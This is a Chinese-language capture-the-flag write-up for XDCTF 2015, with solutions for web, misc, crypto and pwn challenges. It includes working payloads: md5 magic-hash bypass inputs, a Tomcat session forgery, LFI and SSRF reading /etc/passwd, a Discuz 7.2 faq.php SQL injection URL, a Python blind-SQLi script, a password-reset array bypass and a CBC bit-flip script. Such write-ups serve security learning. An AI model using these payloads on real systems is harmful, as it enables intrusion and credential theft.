# XDCTF-WriteUp TEAM:我们是来打酱油的

标签（空格分隔）： XDCTF writeup

---
##WEB1
###WEB1-100
首先网站源码：
http://133.130.90.172/5008e9a6ea2ab282a9d646befa70d53a/index.php~
www.phpjm.net 加密后的php文件，解密后的代码为：
```php:n
<?php
$test=$_GET['test']; 
$test=md5($test); 
if($test=='0') 
{ 
	print "flag{xxxxxx}"; 
} 
else print "you are falied!"; 
print $test; 
echo "tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"; 
?>
```
构造md5($test)=0exxxxx  xxx为数字，可以绕过，google一下，有现成的：
```bash:n
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -
$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -
$ echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  -
```
提交即可得到flag

###WEB1-200
地址是：http://flagbox-23031374.xdctf.win:1234/
登陆页面是：http://flagbox-23031374.xdctf.win:1234/examples/
扫了下目录，发现：http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
tomcat的SessionExample,这样可以伪造管理的session登陆页面了，我们修改
```
Session ID: E528F4CE77E6E89A44D6EE518DE32011 
Created: Sat Oct 03 18:47:15 JST 2015
Last Accessed: Sat Oct 03 18:48:31 JST 2015
The following data is in your session:
user = Administrator
logIn = true
```
再次访问登陆页面,获得flag

###WEB1-300
地址：http://133.130.90.188/
这题出的有点意思，首先首页有LFI和ssrf:
读passwd文件：
```:n
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
ntp:x:105:112::/home/ntp:/bin/false
mysql:x:1000:1000::/home/mysql:/sbin/nologin
www:x:1001:1001::/home/www:/sbin/nologin
```
以为是要LFI getshell，试了各种方法都不行，然后读了Index.php的源码看了下：
```php:n
 <?php
    if (isset($_GET['link'])) {
        $link = $_GET['link'];
        // disable sleep
        if (strpos(strtolower($link), 'sleep') || strpos(strtolower($link), 'benchmark')) {
            die('No sleep.');
        }
        if (strpos($link,"http://") === 0) {
            // http
            $curlobj = curl_init($link);
            curl_setopt($curlobj, CURLOPT_HEADER, 0);
            curl_setopt($curlobj, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);
            curl_setopt($curlobj, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($curlobj, CURLOPT_TIMEOUT, 5);
            $content = curl_exec($curlobj);
            curl_close($curlobj);
            echo $content;

        } elseif (strpos($link,"file://") === 0) {
            // file
            echo file_get_contents(substr($link, 7));
        }
    } else {
        echo<<<EOF
		<!--你瞅啥-->
        <br><br><br>
        <center>
        <h1>What do you want to read?</h1>
        <form method="GET" action="#">
        <input style="width:300px; height:25px;" name="link" value="" /> 
        <button style="height:25px;" type="submit">Read</button>
        </form>
        </center>
EOF;
    }
?>
```
随后各种瞎找，在/etc/hosts里面看到好东西：
```n
127.0.0.1	localhost
127.0.1.1	ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1	9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com
```
结合passwd文件里面有两个web目录,首先本地直接访问9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com 无法访问，利用页面读取发现和首页是一样的，然后利用burp爆破了一下端口
133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com:xxxx
发现3389端口有另外一个web服务，是一个dz 7.2的站，果断上dz fap.php 的exp往上打：
```n
http://133.130.90.188/?link=http%3A%2f%2f9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com%3A3389%2ffaq.php%3Faction%3Dgrouppermission%26gids%5B99%5D%3D%2527%26gids%5B100%5D%5B0%5D%3D%29%2520and%2520%28select%25201%2520from%2520%28select%2520count%28%2a%29%2Cconcat%28%28select%2520%28select%2520%28select%2520concat%28username%2C0x27%2Cpassword%29%2520from%2520cdb_members%2520limit%25201%29%2520%29%2520from%2520%60information_schema%60.tables%2520limit%25200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%2520from%2520information_schema.tables%2520group%2520by%2520x%29a%29%2523
```
爆出的管理员的密码就是flag

###WEB1-400
访问页面发现首页的图片有点奇怪：
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php
居然是一个php文件，下载下来，打开发现文件结尾有：
```n
<!--Please input the ID as parameter with numeric value-->
```
目测应该是注入，一开始测了半天啥也没用，后来发了hint提示",发现是bool blind sql injection:
```n
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=11111111%22%20or%201=1%23  true
http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID=11111111%22%20or%201=2%23  false
```
尝试盲注的时候发现各种函数被禁了，最后发现rpad可以使用，写了个脚本跑一下：
```python:n
__author__ = 'F4nt45i4-kow'
import urllib
payloads = list('0123456789abcdefghijklmnopqrstuvwxyz@_./:')
c = ''
for i in range(1,35):
    for payload in payloads:
        url = 'http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID='
        a = c + payload
        pay1 = '11" or if(rpad((Password),%s,1)=\'%s\',1,0)#' % (i,a)
        pay = urllib.quote(pay1)
        url = url + pay
        f = urllib.urlopen(url)
        s = f.read()
        if(len(s) == 25938):
            c += payload
            a = ''
            #print i,':',payload
            print i,':',c
            break
```
这里有一点，因为注入点和用户的信息在同一个表中，就不需要select * from进行查询了，直接用字段名进行查询就可以了（这里卡了好长时间）
爆出账号密码为：
```n
username=admin
password=5832f4251cb6f43917df
```
加密后的密码是20位的hash，根据多年撸站经验，和dedecms的hash是一样的，去掉前三后一放到cmd5上得到密码：lu5631209
然后登陆，得到flag

##WEB2
##WEB2-200
使用rip-git.pl
`./rip-git.pl -v -u http://xdsec-cms-12023458.xdctf.win/.git/`
`git log`一下 看到之前的commit
`git reset --hard d16ecb17678b0297516962e2232080200ce7f2b3`即可看到源码
在index.php中找到flag。
##WEB2-100
有问题的代码在resetpwd的地方：
```php:n
public function handle_resetpwd()
    {
        if(empty($_GET["email"]) || empty($_GET["verify"])) {
            $this->error("Bad request", site_url("auth/forgetpwd"));
        }
        $user = $this->user->get_user(I("get.email"), "email");
        if(I('get.verify') != $user['verify']) {
            $this->error("Your verify code is error", site_url('auth/forgetpwd'));
        }
        if($this->input->method() == "post") {
            $password = I("post.password");
            if(!$this->confirm_password($password)) {
                $this->error("Confirm password error");
            }
            if(!$this->complex_password($password)) {
                $this->error("Password must have at least one alpha and one number");
            }
            if(strlen($password) < 8) {
                $this->error("The Password field must be at least 8 characters in length");
            }
            $this->user->update_userinfo([
                "password" => $password,
                "verify" => null
            ], $user["uid"]);
            $this->success("Password update successful!", site_url("auth/login"));
        } else {
            $url = site_url("auth/resetpwd") . "?email={$user['email']}&verify={$user['verify']}";
            $this->view("resetpwd.html", ["form_url" => $url]);
        }
    }
```
绕过`I('get.verify') != $user['verify']`的验证即可，可以通过构造数组verify[]=1，即可绕过
访问:
`http://xdsec-cms-12023458.xdctf.win/index.php/auth/resetpwd?email=xdsec-cms@xdctf.com&verify[]=1`
抓包重置管理的密码，登录后在上传的文件中获得flag

##MISC
###MISC100
将png的IDAT解压出来可以看到蓝色平面隐藏了信息，用脚本提取出来后，按照如下对应关系：
`(R*65536+G*256+B) % 11`
将`0-7`分别替换成`brainfuck`语言中`><+-.,[]`然后执行得到flag
###MISC200
这题考察的是已经知道某个压缩包的明文，解出另外一个压缩包的加密文件：
`http://blog.csdn.net/jiangwlee/article/details/6911087`
按照文中方法破解zip得到flag

##CRYPT
###CRYPT200
pbiernat/BlackBoxChal2的原题，写个脚本跑一下：
```python:n
__author__ = 'F4nt45i4-nlfox'
import socket
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('133.130.52.128',6666))
buf=4096
sock.send('mkprof:Xadmin=true')
data = sock.recv(buf)
print data
ct = data[:-1].decode('hex')
l = list(ct)
l[16] = chr(ord(l[16]) ^ ord('X') ^ ord(';'))
ct = ''.join(l)
print ct.encode('hex')
sock.send('parse:'+ct.encode('hex'))
print sock.recv(buf)
```
###CRYPT300
原题：`https://stratum0.org/blog/posts/2013/09/23/csaw2013-slurp/`

##REVERSE
###REVERSE100
###REVERSE200
###REVERSE500

##PWN
###PWN100
通过样本特征，判断为CVE-2012-0158的POC样本，运行之后，用windbg搜索发现flag字符串
###PWN300
###PWN400



